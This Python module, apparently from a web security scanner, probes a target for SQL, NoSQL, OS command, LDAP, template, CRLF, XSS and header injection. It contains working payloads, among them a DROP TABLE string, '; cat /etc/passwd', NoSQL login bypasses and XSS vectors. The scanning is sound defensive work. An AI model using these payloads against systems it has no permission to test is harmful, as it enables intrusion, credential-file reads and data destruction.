"""
Comprehensive Injection Testing Module
Tests: SQL, NoSQL, OS command, LDAP, SSTI, CRLF, and XSS injection vectors.
"""

import re
import time
from urllib.parse import urljoin, quote
from colorama import Fore, Style
from modules.payload_updater import PayloadUpdater


class InjectionTester:
    def __init__(self, session, base_url):
        self.session = session
        self.base_url = base_url
        self.findings = []
        self.updater = PayloadUpdater()

        # Load dynamic payloads if available, keeping lists manageable
        self.sqli_payloads = self.updater.load_payloads('sqli_payloads.txt', max_payloads=100)
        self.xss_payloads = self.updater.load_payloads('xss_payloads.txt', max_payloads=100)

    def run_all_checks(self):
        """Run all injection tests."""
        print(f"{Fore.CYAN}[*] Comprehensive Injection Testing{Style.RESET_ALL}")

        self.test_sql_injection_error_based()
        self.test_sql_injection_blind_boolean()
        self.test_sql_injection_time_based()
        self.test_sql_injection_union()
        self.test_nosql_injection()
        self.test_os_command_injection()
        self.test_ldap_injection()
        self.test_ssti()
        self.test_crlf_injection()
        self.test_xss_reflected()
        self.test_xss_polyglot()
        self.test_header_injection()

        return self.findings

    def _get_test_params(self):
        """Get common injectable parameters."""
        return ['id', 'user', 'q', 'search', 'username', 'email', 'name',
                'page', 'file', 'category', 'sort', 'order', 'filter', 'type']

    def _get_test_endpoints(self):
        """Get common endpoints to test."""
        return ['/search', '/api/search', '/users', '/api/users',
                '/products', '/api/products', '/login', '/api/login']

    def test_sql_injection_error_based(self):
        """Test for error-based SQL injection."""
        print(f"{Fore.YELLOW}[*] Testing error-based SQL injection...{Style.RESET_ALL}")

        payloads = self.sqli_payloads if self.sqli_payloads else [
            "'", "''", "' OR '1'='1", "' OR 1=1 --", "'; DROP TABLE users; --",
            "' UNION SELECT NULL--", "1' ORDER BY 10--", "' AND 1=CONVERT(int, @@version)--"
        ]

        sql_errors = [
            'sql syntax', 'mysql_fetch', 'mysql_num_rows', 'ora-', 'oracle error',
            'postgresql error', 'pg_query', 'sqlite3', 'microsoft jet database',
            'odbc driver', 'sql server', 'unclosed quotation', 'unterminated string',
            'syntax error', 'sqlstate', 'database error', 'db error'
        ]

        for param in self._get_test_params()[:6]:
            for payload in payloads:
                try:
                    url = f"{self.base_url}/search?{param}={quote(payload)}"
                    response = self.session.get(url, timeout=5)

                    if any(error in response.text.lower() for error in sql_errors):
                        self.findings.append({
                            'title': 'SQL Injection (Error-Based)',
                            'description': f'Error-based SQLi in parameter: {param}',
                            'severity': 'CRITICAL',
                            'category': 'injection',
                            'owasp': 'A03:2021',
                            'cwe': 'CWE-89',
                            'remediation': 'Use parameterized queries/prepared statements. Never concatenate user input into SQL.',
                            'evidence': f'Payload "{payload}" triggered SQL error in {param}',
                            'mitre_attack': 'T1190'
                        })
                        return
                except Exception:
                    continue

    def test_sql_injection_blind_boolean(self):
        """Test for boolean-based blind SQL injection."""
        print(f"{Fore.YELLOW}[*] Testing blind boolean SQL injection...{Style.RESET_ALL}")

        for param in self._get_test_params()[:4]:
            try:
                # True condition
                true_url = f"{self.base_url}/search?{param}=1' AND '1'='1"
                true_resp = self.session.get(true_url, timeout=5)

                # False condition
                false_url = f"{self.base_url}/search?{param}=1' AND '1'='2"
                false_resp = self.session.get(false_url, timeout=5)

                # If responses differ significantly, may be vulnerable
                if abs(len(true_resp.text) - len(false_resp.text)) > 100:
                    self.findings.append({
                        'title': 'SQL Injection (Blind Boolean)',
                        'description': f'Boolean-based blind SQLi in parameter: {param}',
                        'severity': 'CRITICAL',
                        'category': 'injection',
                        'owasp': 'A03:2021',
                        'cwe': 'CWE-89',
                        'remediation': 'Use parameterized queries. Response should not change based on injected conditions.',
                        'evidence': f"True condition: {len(true_resp.text)} bytes, False: {len(false_resp.text)} bytes"
                    })
                    return
            except Exception:
                continue

    def test_sql_injection_time_based(self):
        """Test for time-based blind SQL injection."""
        print(f"{Fore.YELLOW}[*] Testing time-based SQL injection...{Style.RESET_ALL}")

        payloads = [
            "1' AND SLEEP(3)--",
            "1'; WAITFOR DELAY '0:0:3'--",
            "1' AND pg_sleep(3)--",
        ]

        for param in self._get_test_params()[:3]:
            for payload in payloads:
                try:
                    url = f"{self.base_url}/search?{param}={quote(payload)}"
                    start = time.time()
                    self.session.get(url, timeout=10)
                    elapsed = time.time() - start

                    if elapsed >= 2.5:  # Response delayed ~3 seconds
                        self.findings.append({
                            'title': 'SQL Injection (Time-Based Blind)',
                            'description': f'Time-based blind SQLi in parameter: {param}',
                            'severity': 'CRITICAL',
                            'category': 'injection',
                            'owasp': 'A03:2021',
                            'cwe': 'CWE-89',
                            'remediation': 'Use parameterized queries. Server should not execute injected delay commands.',
                            'evidence': f'Payload "{payload}" caused {elapsed:.1f}s delay'
                        })
                        return
                except Exception:
                    continue

    def test_sql_injection_union(self):
        """Test for UNION-based SQL injection."""
        print(f"{Fore.YELLOW}[*] Testing UNION-based SQL injection...{Style.RESET_ALL}")

        for param in self._get_test_params()[:4]:
            for col_count in range(1, 10):
                nulls = ','.join(['NULL'] * col_count)
                payload = f"' UNION SELECT {nulls}--"
                try:
                    url = f"{self.base_url}/search?{param}={quote(payload)}"
                    response = self.session.get(url, timeout=5)

                    if response.status_code == 200 and 'null' not in response.text.lower():
                        if 'error' not in response.text.lower():
                            self.findings.append({
                                'title': 'SQL Injection (UNION-Based)',
                                'description': f'UNION-based SQLi with {col_count} columns in parameter: {param}',
                                'severity': 'CRITICAL',
                                'category': 'injection',
                                'owasp': 'A03:2021',
                                'cwe': 'CWE-89',
                                'remediation': 'Use parameterized queries. Validate and sanitize all inputs.',
                                'evidence': f'UNION SELECT with {col_count} columns succeeded in {param}'
                            })
                            return
                except Exception:
                    continue

    def test_nosql_injection(self):
        """Test for advanced NoSQL injection (MongoDB, CouchDB, etc.)."""
        print(f"{Fore.YELLOW}[*] Testing Advanced NoSQL injection vectors...{Style.RESET_ALL}")

        payloads = [
            # Authentication Bypass via Operator Injection
            {'username': {'$ne': None}, 'password': {'$ne': None}},
            {'username': {'$gt': ''}, 'password': {'$gt': ''}},
            {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}},
            {'username': {'$nin': ['admin', 'root']}, 'password': {'$ne': 'invalid'}},
            # JavaScript evaluation / Sleep based ($where)
            {'$where': 'this.password.match(/./)'},
            {'$where': 'sleep(2)'},
            {'username': {'$where': 'function(){return true;}'}},
            # Query manipulation
            'admin" || "1"=="1',
            'admin" && this.password.match(/.*/)//',
            'admin" || true || "',
            #'$or': [ {}, { 'username': 'admin' } ]
        ]

        # Extract NoSQL endpoints using Payload Updater if available, else fallback
        endpoints = ['/api/login', '/login', '/api/auth', '/users/find', '/api/search', '/api/v1/user']

        def run_nosql_test(endpoint):
            url = urljoin(self.base_url, endpoint)
            for payload in payloads:
                try:
                    # Test as JSON body
                    resp = self.session.post(url, json=payload, timeout=5)
                    
                    # Test as URL encoded (for platforms that parse array brackets in URL e.g. PHP/Express)
                    if isinstance(payload, dict):
                        # Simple flat representation for URL encoding
                        params = {f"{k}[{list(v.keys())[0]}]": list(v.values())[0] for k,v in payload.items() if isinstance(v, dict)}
                        resp_url = self.session.get(url, params=params, timeout=5)
                    
                    if resp.status_code == 200:
                        if any(k in resp.text.lower() for k in ['token', 'session', 'welcome', 'dashboard', 'success', 'admin']):
                            if 'error' not in resp.text.lower():
                                self.findings.append({
                                    'title': 'Advanced NoSQL Injection',
                                    'description': f'NoSQL operator injection at {endpoint} — potential authentication bypass or data extraction',
                                    'severity': 'CRITICAL',
                                    'category': 'injection',
                                    'owasp': 'A03:2021',
                                    'api_owasp': 'API8:2023',
                                    'cwe': 'CWE-943',
                                    'remediation': 'Validate input types strictly (ensure strings are strings, not objects/dicts), use schema validation (Mongoose), sanitize MongoDB operators.',
                                    'evidence': f'Payload {payload} returned 200 OK and success indicators at {endpoint}',
                                    'mitre_attack': 'T1190'
                                })
                                return
                except Exception:
                    continue
                    
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(run_nosql_test, endpoints)

    def test_os_command_injection(self):
        """Test for OS command injection."""
        print(f"{Fore.YELLOW}[*] Testing OS command injection...{Style.RESET_ALL}")

        payloads = [
            ('; id', ['uid=', 'gid=']),
            ('| id', ['uid=', 'gid=']),
            ('|| id', ['uid=', 'gid=']),
            ('`id`', ['uid=', 'gid=']),
            ('$(id)', ['uid=', 'gid=']),
            ('; cat /etc/passwd', ['root:', '/bin/']),
            ('| dir', ['Directory of', '<DIR>']),
            ('; whoami', []),
            ('& ping -c 1 127.0.0.1', ['bytes from', 'ttl=']),
        ]

        test_params = ['ping', 'host', 'ip', 'domain', 'file', 'cmd', 'exec', 'run']
        test_endpoints = ['/tools', '/api/tools', '/ping', '/api/ping', '/dns', '/lookup']

        for endpoint in test_endpoints:
            for param in test_params:
                for payload, indicators in payloads:
                    try:
                        url = f"{urljoin(self.base_url, endpoint)}?{param}=127.0.0.1{quote(payload)}"
                        response = self.session.get(url, timeout=5)

                        if indicators:
                            if any(ind in response.text for ind in indicators):
                                self.findings.append({
                                    'title': 'OS Command Injection',
                                    'description': f'Command injection in {param} at {endpoint}',
                                    'severity': 'CRITICAL',
                                    'category': 'injection',
                                    'owasp': 'A03:2021',
                                    'cwe': 'CWE-78',
                                    'remediation': 'Never pass user input to system commands. Use APIs instead of shell commands.',
                                    'evidence': f'Payload "{payload}" executed at {endpoint}?{param}=',
                                    'mitre_attack': 'T1059'
                                })
                                return
                    except Exception:
                        continue

    def test_ldap_injection(self):
        """Test for LDAP injection."""
        print(f"{Fore.YELLOW}[*] Testing LDAP injection...{Style.RESET_ALL}")

        payloads = ['*', '*()|(&)', '*)(objectClass=*)', 'admin)(&)', '*(cn=*)']

        for endpoint in ['/search', '/api/search', '/ldap', '/api/ldap', '/login']:
            for payload in payloads:
                try:
                    url = urljoin(self.base_url, endpoint)
                    response = self.session.get(f"{url}?q={quote(payload)}", timeout=5)

                    if response.status_code == 200 and len(response.text) > 100:
                        if any(k in response.text.lower() for k in ['dn:', 'cn=', 'objectclass', 'ldap']):
                            self.findings.append({
                                'title': 'LDAP Injection',
                                'description': f'LDAP injection at {endpoint}',
                                'severity': 'HIGH',
                                'category': 'injection',
                                'cwe': 'CWE-90',
                                'remediation': 'Escape special LDAP characters, use parameterized LDAP queries',
                                'evidence': f'Payload "{payload}" returned LDAP data'
                            })
                            return
                except Exception:
                    continue

    def test_ssti(self):
        """Test for Server-Side Template Injection."""
        print(f"{Fore.YELLOW}[*] Testing SSTI (template injection)...{Style.RESET_ALL}")

        payloads = [
            ('{{7*7}}', '49', 'Jinja2/Twig'),
            ('${7*7}', '49', 'Freemarker/Thymeleaf'),
            ('<%= 7*7 %>', '49', 'ERB/EJS'),
            ('#{7*7}', '49', 'Ruby/Pug'),
            ('{{constructor.constructor("return 7*7")()}}', '49', 'AngularJS Sandbox Bypass'),
        ]

        for param in ['name', 'q', 'search', 'template', 'message', 'user']:
            for payload, expected, engine in payloads:
                try:
                    url = f"{self.base_url}/search?{param}={quote(payload)}"
                    response = self.session.get(url, timeout=5)

                    if expected in response.text and payload not in response.text:
                        self.findings.append({
                            'title': f'Server-Side Template Injection ({engine})',
                            'description': f'SSTI in parameter {param} — {engine} engine detected',
                            'severity': 'CRITICAL',
                            'category': 'injection',
                            'owasp': 'A03:2021',
                            'cwe': 'CWE-1336',
                            'remediation': 'Never pass user input directly to template engines. Use sandboxing.',
                            'evidence': f'Payload {payload} evaluated to {expected}',
                            'mitre_attack': 'T1190'
                        })
                        return
                except Exception:
                    continue

    def test_crlf_injection(self):
        """Test for CRLF / HTTP response splitting."""
        print(f"{Fore.YELLOW}[*] Testing CRLF injection...{Style.RESET_ALL}")

        payloads = [
            '%0d%0aX-Injected: true',
            '%0aX-Injected: true',
            '\r\nX-Injected: true',
            '%E5%98%8A%E5%98%8DX-Injected: true',  # Unicode bypass
        ]

        for param in ['url', 'redirect', 'next', 'return', 'q']:
            for payload in payloads:
                try:
                    url = f"{self.base_url}/redirect?{param}={payload}"
                    response = self.session.get(url, timeout=5, allow_redirects=False)

                    if 'X-Injected' in str(response.headers):
                        self.findings.append({
                            'title': 'CRLF Injection / HTTP Response Splitting',
                            'description': f'CRLF injection in {param} parameter',
                            'severity': 'HIGH',
                            'category': 'injection',
                            'owasp': 'A03:2021',
                            'cwe': 'CWE-113',
                            'remediation': 'Strip CR/LF characters from user input before including in HTTP headers',
                            'evidence': f'Injected header via {param} parameter'
                        })
                        return
                except Exception:
                    continue

    def test_xss_reflected(self):
        """Test for reflected XSS."""
        print(f"{Fore.YELLOW}[*] Testing reflected XSS...{Style.RESET_ALL}")

        payloads = self.xss_payloads if self.xss_payloads else [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            "javascript:alert('XSS')",
            '"><script>alert(1)</script>',
            "' onmouseover='alert(1)'",
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
        ]

        for param in ['q', 'search', 'name', 'comment', 'message', 'input', 'user', 'error']:
            for payload in payloads:
                try:
                    url = f"{self.base_url}/search?{param}={quote(payload)}"
                    response = self.session.get(url, timeout=5)

                    if payload in response.text:
                        self.findings.append({
                            'title': 'Reflected Cross-Site Scripting (XSS)',
                            'description': f'Reflected XSS in parameter {param}',
                            'severity': 'HIGH',
                            'category': 'injection',
                            'owasp': 'A03:2021',
                            'cwe': 'CWE-79',
                            'remediation': 'HTML-encode output, implement CSP, validate input',
                            'evidence': f'Payload "{payload[:40]}" reflected in response at {param}',
                            'mitre_attack': 'T1189'
                        })
                        return
                except Exception:
                    continue

    def test_xss_polyglot(self):
        """Test with XSS polyglot payloads."""
        print(f"{Fore.YELLOW}[*] Testing XSS polyglot payloads...{Style.RESET_ALL}")

        polyglot = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0nSrc=%26telerik%%0nErr=confirm(telerik)/*%0d%0a%0d%0a//<svg/onload=prompt(telerik)>//"

        for param in ['q', 'search', 'name']:
            try:
                url = f"{self.base_url}/search?{param}={quote(polyglot[:80])}"
                response = self.session.get(url, timeout=5)

                if 'onclick' in response.text.lower() or 'onerror' in response.text.lower():
                    self.findings.append({
                        'title': 'XSS via Polyglot Payload',
                        'description': f'XSS polyglot accepted in parameter {param}',
                        'severity': 'HIGH',
                        'category': 'injection',
                        'cwe': 'CWE-79',
                        'remediation': 'Implement strict output encoding and Content Security Policy',
                        'evidence': f'Polyglot payload reflected in {param}'
                    })
                    return
            except Exception:
                continue

    def test_header_injection(self):
        """Test for header injection via user input."""
        print(f"{Fore.YELLOW}[*] Testing header injection...{Style.RESET_ALL}")

        injection_headers = {
            'X-Forwarded-For': '127.0.0.1" OR 1=1 --',
            'X-Forwarded-Host': 'evil.com',
            'X-Original-URL': '/admin',
            'X-Rewrite-URL': '/admin',
            'Referer': '<script>alert(1)</script>',
            'User-Agent': "' OR '1'='1",
        }

        try:
            response = self.session.get(self.base_url, headers=injection_headers, timeout=5)
            # Check if any injected value appears in response
            for header, value in injection_headers.items():
                if value in response.text:
                    self.findings.append({
                        'title': 'Header Value Injection',
                        'description': f'Header {header} value reflected in response',
                        'severity': 'MEDIUM',
                        'category': 'injection',
                        'cwe': 'CWE-113',
                        'remediation': 'Sanitize and validate all header values before using in application logic',
                        'evidence': f'{header}: {value} reflected in response body'
                    })
                    return
        except Exception:
            pass
